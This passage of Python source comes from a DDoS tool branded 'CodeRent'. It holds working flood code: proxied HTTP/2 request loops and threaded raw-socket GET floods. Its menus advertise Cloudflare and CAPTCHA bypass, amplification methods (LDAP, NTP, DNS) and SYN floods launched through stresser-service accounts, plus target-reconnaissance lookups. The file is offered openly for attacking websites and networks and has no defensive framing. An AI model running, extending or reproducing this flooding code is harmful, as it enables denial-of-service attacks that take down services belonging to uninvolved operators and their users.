            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def test1(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    #req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=test2,args=(until, target, req,))
            thd.start()
        except:  
            pass

def test2(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass


#endregion

def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')
##############################################################################################
def help():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"  ╦ ╦╔═╗╦  ╔═╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╠═╣║╣ ║  ╠═╝             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╩ ╩╚═╝╩═╝╩                \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer7   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer7 Methods                    "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer4   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer4 Methods                    "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show tools                             "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"credit   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show credit                            "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Exit CodeRent DDoS                     "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╠═════════════════════════════════════════════════════╣\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for using CodeRent.             "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Plz star project :)                    "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/trongthaohub                "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def credit():
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Developer "+Fore.RED+": \x1b[38;2;0;255;189mTrThaoDev\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"UI Design "+Fore.RED+": \x1b[38;2;0;255;189mTrThaoDev\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Methods/Tools "+Fore.RED+": \x1b[38;2;0;255;189mTrThaoDev\n")
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
    stdout.write("\n")    
##############################################################################################
def layer7():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩              \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╔══════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"CLOUDFLARE    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CloudFlare Attack          "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"RAW           "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Raw HTTP Request Attack           "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"HEAVYJES      "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Heavy HTTP Request Attack         "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"REQUESTS      "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Multi-Request Bypass Attack       "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"HTTP          "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Standard HTTP/1.1 Attack          "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"HTTPS         "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Secure HTTPS Attack               "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"CAPTCHA-BYPASS"+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CAPTCHA & Security         "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"CFBYPASSV2    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Enhanced CloudFlare Bypass        "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"SOCKET        "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Direct Socket Connection Attack   "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"TLS           "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" TLS 1.3/HTTP2 Request Attack      "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╚══════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def layer4():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"UDP        "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack            "+Fore.LIGHTCYAN_EX+"║"+Fore.LIGHTWHITE_EX+" STUN       "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"LDAP       "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" LDAP Attack           "+Fore.LIGHTCYAN_EX+"║"+Fore.LIGHTWHITE_EX+" VSE        "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"ARD        "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" ARD Attack            "+Fore.LIGHTCYAN_EX+"║"+Fore.LIGHTWHITE_EX+" ACK        "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"VOX        "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" VOX Attack            "+Fore.LIGHTCYAN_EX+"║"+Fore.LIGHTWHITE_EX+" IPX        "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"KGB        "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" KGB Attack            "+Fore.LIGHTCYAN_EX+"║"+Fore.LIGHTWHITE_EX+" PROWIN     "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"DNS        "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" DNS Attack            "+Fore.LIGHTCYAN_EX+"║"+Fore.LIGHTWHITE_EX+" NTP        "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"TCP        "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" TCP Attack            "+Fore.LIGHTCYAN_EX+"║"+Fore.LIGHTWHITE_EX+" WIZARD     "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"XSYN       "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" XSYN Attack           "+Fore.LIGHTCYAN_EX+"║"+Fore.LIGHTWHITE_EX+" ZAP        "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"ZSYN       "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" ZSYN Attack           "+Fore.LIGHTCYAN_EX+"║           "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def tools():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +" ║ ║ ║║ ║║  ╚═╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +" ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Geo IP Address Lookup"+Fore.LIGHTCYAN_EX+"                     ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Classic DNS Lookup   "+Fore.LIGHTCYAN_EX+"                     ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet"+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup   "+Fore.LIGHTCYAN_EX+"               ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def title():
    stdout.write("                                                                                          \n")
    stdout.write("                             "+Fore.LIGHTWHITE_EX  +"╔═╗╔═╗╔═╗╔═╗╦═╗╔═╗╔╗╔╔╦╗        \n")
    stdout.write("                             "+Fore.LIGHTCYAN_EX   +"║  ║ ║║ ║║╣ ╠╦╝║╣ ║║║ ║         \n")
    stdout.write("                             "+Fore.LIGHTCYAN_EX   +"╚═╝╚═╝╩═╝╚═╝╩╚═╚═╝╩ ╩ ╩         \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Welcome To The Main Screen Of CodeRent"+Fore.LIGHTCYAN_EX  +"       ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"          Type [help] to see the Commands    "+Fore.LIGHTCYAN_EX +"       ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"         Contact Dev - Telegram @czabcdb    "+Fore.LIGHTCYAN_EX +"        ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def command():
    stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"CodeRent"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        title()
    elif command == "help" or command == "?":
        help()
    elif command == "sessions":
        clear()
        stdout.write(f"\n {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} Active HardStresser Sessions:\n")
        for i, acc in enumerate(HARDSTRESSER_SESSIONS):
            status = f"{Fore.GREEN}(Ready)" if not acc['busy'] else f"{Fore.RED}(Busy/Attacking)"
            stdout.write(f" {i+1}. {acc['user']} {status}{Fore.WHITE}\n")
        stdout.write(f"\n Total: {len(HARDSTRESSER_SESSIONS)}\n")
        stdout.write("\n Press Enter to continue...")
        input()
        title()
    elif command == "credit":
        credit()        
    elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
        layer7()
    elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
        layer4()
    elif command == "tools" or command == "tool":
        tools()
    elif command == "exit":
        exit()
    elif command == "test":
        target, port, t = get_info_l7()
        launch_api_attack(target, port, t, "HTTP")
        time.sleep(10)
    elif command == "http2" or command == "HTTP2" or command == "TLS":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "HTTP2")
        timer.join()
    elif command == "pxhttp2" or command == "PXHTTP2":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "HTTP2")
        timer.join()
    elif command == "cfb" or command == "CFB" or command == "CLOUDFLARE" or command == "HEAVYJES":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "CLOUDFLARE")
        timer.join()
    elif command == "pxcfb" or command == "PXCFB" or command == "CFBYPASSV2":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "CLOUDFLARE")
        timer.join()
    elif command == "pps" or command == "PPS":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "PPS")
        timer.join() 
    elif command == "spoof" or command == "SPOOF":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "SPOOF")
        timer.join() 
    elif command == "pxspoof" or command == "PXSPOOF":
        target, port, t = get_info_l7()
        launch_api_attack(target, port, t, "SPOOF")
        time.sleep(10)
    elif command == "get" or command == "GET" or command == "HTTP":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "HTTP")
        timer.join()
    elif command == "post" or command == "POST":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "POST")
        timer.join()
    elif command == "head" or command == "HEAD":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "HEAD")
        timer.join()
    elif command == "pxraw" or command == "PXRAW" or command == "RAW":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "RAW")
        timer.join()
    elif command == "soc" or command == "SOC" or command == "SOCKET":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "SOCKET")
        timer.join()
    elif command == "pxsoc" or command == "PXSOC":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "SOCKET")
        timer.join()
    elif command == "cfreq" or command == "CFREQ" or command == "REQUESTS":
        target, port, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Requesting API Attack via Stresser...\n")
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "REQUESTS")
        timer.join()
    elif command == "cfsoc" or command == "CFSOC" or command == "CAPTCHA-BYPASS":
        target, port, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Requesting API Attack via Stresser...\n")
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "CAPTCHA-BYPASS")
        timer.join()
    elif command == "pxsky" or command == "PXSKY":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "SKY")
        timer.join()
    elif command == "sky" or command == "SKY" or command == "HTTPS":
        target, port, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_api_attack(target, port, t, "SKY")
        timer.join()
    elif command == "udp" or command == "UDP" or command == "LDAP" or command == "ARD" or command == "VOX" or command == "STUN" or command == "VSE" or command == "DNS" or command == "NTP" or command == "KGB" or command == "PROWIN" or command == "WIZARD" or command == "ZAP":
        target, port, t = get_info_l4()
        launch_api_attack(target, port, t, command.upper())
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "tcp" or command == "TCP" or command == "ACK" or command == "IPX" or command == "XSYN" or command == "ZSYN":
        target, port, t = get_info_l4()
        launch_api_attack(target, port, t, command.upper())
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
        

##############################################################################################     
    elif command == "subnet":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')                   
            
    elif command == "dns":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
            
    elif command == "geoip":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    else:
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")  
##############################################################################################   

def func():
    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"sky        "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS Sky method without proxies\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
    
    #stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")

    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")
    
    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Thanks for\n")

if __name__ == '__main__':
    init(convert=True)
    try:
        if len(sys.argv) < 2:
            setup_accounts()
            clear()
            title()
            while True:
                command()
        elif len(sys.argv) == 5:
            method = sys.argv[1].rstrip()
            target = sys.argv[2].rstrip()
            port   = sys.argv[3].rstrip()
            t      = sys.argv[4].rstrip()
            if int(t) > 60: t = "60"
            if method == "UDP" or method == "LDAP" or method == "ARD" or method == "VOX" or method == "STUN" or method == "VSE" or method == "DNS" or method == "NTP" or method == "KGB" or method == "PROWIN" or method == "WIZARD" or method == "ZAP":
                launch_api_attack(target, port, t, method)
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                timer.join()
            elif method == "TCP" or method == "ACK" or method == "IPX" or method == "XSYN" or method == "ZSYN":
                launch_api_attack(target, port, t, method)
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                timer.join()
            sys.exit()
        elif len(sys.argv) == 4:
            method = sys.argv[1].rstrip()
            target = sys.argv[2].rstrip()
            t      = sys.argv[3].rstrip()
            if int(t) > 60: t = "60"
            if method == "cfb" or method == "CLOUDFLARE" or method == "HEAVYJES":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "443", t, "CLOUDFLARE")
                timer.join()
            elif method == "pxcfb" or method == "CFBYPASSV2":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "443", t, "CLOUDFLARE")
                timer.join()
            elif method == "get" or method == "HTTP":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "80", t, "HTTP")
                timer.join()
            elif method == "post" or method == "POST":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "80", t, "POST")
                timer.join()
            elif method == "head" or method == "HEAD":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "80", t, "HEAD")
                timer.join()
            elif method == "pxraw" or method == "RAW":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "80", t, "RAW")
                timer.join()
            elif method == "soc" or method == "SOCKET":
